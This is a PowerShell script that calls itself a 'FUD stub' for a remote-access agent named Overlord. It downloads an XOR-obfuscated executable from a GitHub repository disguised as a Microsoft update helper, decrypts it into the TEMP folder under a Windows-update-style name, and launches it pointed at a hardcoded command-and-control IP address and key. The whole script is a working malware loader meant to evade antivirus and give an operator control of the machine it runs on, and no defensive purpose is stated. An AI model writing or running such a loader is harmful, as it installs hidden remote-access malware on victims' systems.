# VOID-9 Overlord GitHub FUD Stub 2026 - Native Go EXE version (working)
Write-Host "=== VOID-9 NATIVE EXECUTION START ===" -ForegroundColor Green

try {
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    Write-Host "Downloading stub..." -ForegroundColor Yellow

    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $data = $wc.DownloadData($url)

    Write-Host "Downloaded $($data.Length) bytes - decrypting..." -ForegroundColor Green

    # XOR decrypt
    for($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor 0x69
    }
    Write-Host "Decryption finished" -ForegroundColor Green

    # Save decrypted exe to temp and run it
    $tempPath = "$env:TEMP\winupdatehelper.exe"
    [IO.File]::WriteAllBytes($tempPath, $data)
    Write-Host "Saved to $tempPath" -ForegroundColor Green

    Write-Host "Launching Overlord agent..." -ForegroundColor Cyan

    # Run the native exe
    Start-Process -FilePath $tempPath -ArgumentList "http://176.65.132.236:5173", "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ" -NoNewWindow -PassThru

    Write-Host "=== AGENT LAUNCHED - CHECK YOUR OVERLORD DASHBOARD IN 5-10 SECONDS ===" -ForegroundColor Green
}
catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "=== VOID-9 NATIVE EXECUTION END ===" -ForegroundColor Green
